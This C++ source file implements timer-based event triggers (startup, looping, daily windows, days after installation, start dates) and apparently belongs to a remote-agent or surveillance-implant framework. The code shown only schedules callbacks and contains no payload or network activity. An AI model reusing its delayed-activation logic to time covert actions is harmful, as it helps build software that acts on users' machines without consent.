#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"

HANDLE eventHandle;

DWORD WINAPI repeatThread(LPVOID lpParam) {
	int *delay = (int *)lpParam;

	for (;;) {
		Sleep(*delay);
		SetEvent(eventHandle);
	}
}

DWORD WINAPI OnTimer(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	Configuration *conf;
	wstring subType;
	int timeStart, timeEnd, delay, iterations;
	
	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		subType = conf->getString(L"subtype");
	} catch (...) {
		subType = L"";
	}

	try {
		timeStart = conf->getInt(L"start");
	} catch (...) {
		timeStart = CONF_ACTION_NULL;
	}

	try {
		timeEnd = conf->getInt(L"end");
	} catch (...) {
		timeEnd = CONF_ACTION_NULL;
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		delay = INFINITE;
	}

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	DBG_TRACE(L"Debug - Timer.cpp - Timer Event is Alive\n", 1, FALSE);

#ifdef _DEBUG
	wprintf(L"Debug - Timer.cpp - Desc: %s, iter: %d, delay: %d\n", conf->getString(L"desc").c_str(), iterations, delay / 1000);
#endif

	if (subType.compare(L"startup") == 0) {
		me->triggerStart();
		me->requestStop();

		WaitForSingleObject(eventHandle, INFINITE);

		DBG_TRACE(L"Debug - Timer.cpp - Timer Startup Event is Closing\n", 1, FALSE);
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	if (subType.compare(L"loop") == 0) {
		int curIterations = 0;

		me->triggerStart();

		LOOP {
			WaitForSingleObject(eventHandle, delay);

			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - Timer.cpp - Timer Event is Closing\n", 1, FALSE);
				me->setStatus(EVENT_STOPPED);

				return 0;
			}

			if (curIterations > iterations) {
				me->requestStop();
				continue;
			}

			me->triggerRepeat();
			curIterations++;
		}
	}

	if (subType.compare(L"daily") == 0) {
		unsigned __int64 ts, te, current;
		int curIterations = 0, sleepTime;
		Date date;
		HANDLE hRepeat;
		DWORD repeatThreadId;

		hRepeat = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)repeatThread, (void*)&delay, 0, &repeatThreadId);

		if (hRepeat == NULL) {
			me->setStatus(EVENT_STOPPED);
			return 0;
		}

		try {
			const wstring startTime = conf->getString(L"ts");
			const wstring endTime = conf->getString(L"te");

			date.setDate(startTime);
			ts = date.stringToAbsoluteMs();

			date.setDate(endTime);
			te = date.stringToAbsoluteMs();
		} catch (...) {
			DBG_TRACE(L"Debug - Timer.cpp - Timer Event is Closing, missing parameters\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			return 0;
		}

		current = date.getCurAbsoluteMs();

		if (current >= ts && current <= te) { // We are in range
			me->triggerStart();
		} else {
			DWORD dwWait;

			if (current < ts) { // We are just before the start time
				dwWait = WaitForSingleObject(eventHandle, (DWORD)(ts - current));
			} else { // Start time is tomorrow
				dwWait = WaitForSingleObject(eventHandle, (DWORD)(ts + date.getMsDay() - current));
			}

			// Handle signaled, we have to stop
			if (dwWait == WAIT_OBJECT_0) {
				DBG_TRACE(L"Debug - Timer.cpp - Timer Event is Closing\n", 1, FALSE);
				me->setStatus(EVENT_STOPPED);

				TerminateThread(hRepeat, 0);
				CloseHandle(hRepeat);
				return 0;
			}

			me->triggerStart();
		}

		// We need to update it! We could arrive here after 24 hours
		te = date.stringToAbsoluteMs();

		// From now on we are in range
		LOOP {
			current = date.getCurAbsoluteMs();

			// Siamo attivi
			if (current + delay > te)
				sleepTime = (int)(te - current); // Just sleep
			else
				sleepTime = delay; // Sleep and exec
			
			WaitForSingleObject(eventHandle, sleepTime);

			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - Timer.cpp - Timer Event is Closing\n", 1, FALSE);
				me->setStatus(EVENT_STOPPED);

				TerminateThread(hRepeat, 0);
				CloseHandle(hRepeat);
				return 0;
			}

			if (curIterations > iterations) {
				me->requestStop();
				continue;
			}

			me->triggerRepeat();
			curIterations++;
		}
	}

	DBG_TRACE(L"Debug - Timer.cpp - *** We shouldn't be here!!!\n", 1, FALSE);
	return 0;
}

DWORD WINAPI OnAfterInst(LPVOID lpParam) {
	HANDLE evHandle;
	Event *me = (Event *)lpParam;
	Configuration *conf;
	Date date;
	int days, installedDays, delay, iterations, curIterations = 0;
	__int64 inst, now;
	Log log;

	evHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	if (log.IsMarkup(EVENT_AFTERINST) == FALSE) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	try {
		days = conf->getInt(L"days");
	} catch (...) {
		days = MAXINT;
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		delay = INFINITE;
	}

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	DBG_TRACE(L"Debug - Timer.cpp - AfterInst Event is Alive\n", 1, FALSE);

	UINT instSize;
	BYTE* instTime;

	instTime = log.ReadMarkup(EVENT_AFTERINST, &instSize);

	if (instTime == NULL) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	memcpy(&inst, instTime, sizeof(inst));

	now = date.getCurAbsoluteMs();

	// How many days from installation?
	now -= inst;
	installedDays = (int)(now / date.getMsDay());

	if (installedDays < days) {
		WaitForSingleObject(evHandle, (days - installedDays) * date.getMsDay());

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Timer.cpp - Timer Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			return 0;
		}
	}

	me->triggerStart();

	LOOP {
		WaitForSingleObject(evHandle, delay);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Timer.cpp - Timer Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			return 0;
		}

		if (curIterations > iterations) {
			me->requestStop();
			continue;
		}

		me->triggerRepeat();
		curIterations++;
	}
}

DWORD WINAPI OnDate(LPVOID lpParam) {
	HANDLE evHandle;
	Event *me = (Event *)lpParam;
	Configuration *conf;
	Date date;
	int delay, iterations, curIterations = 0, curDelay = 0;
	__int64 startDate, now;
	wstring dateFrom;

	evHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		dateFrom = conf->getString(L"datefrom");
	} catch (...) {
		dateFrom = L"2000-01-01 00:00:00";
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		delay = INFINITE;
	}

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	DBG_TRACE(L"Debug - Timer.cpp - OnDate Event is Alive\n", 1, FALSE);

	date.setDate(dateFrom);
	startDate = date.stringDateToMs();

	now = date.getCurAbsoluteMs();

	if (now < startDate) {
		curDelay = (UINT)(startDate - now);
		WaitForSingleObject(evHandle, curDelay);
		
		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Timer.cpp - Date Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			return 0;
		}
	}

	me->triggerStart();
	curDelay = delay;

	LOOP {
		WaitForSingleObject(evHandle, curDelay);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Timer.cpp - Date Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			return 0;
		}

		if (curIterations > iterations) {
			me->requestStop();
			continue;
		}

		me->triggerRepeat();
		curIterations++;
	}
}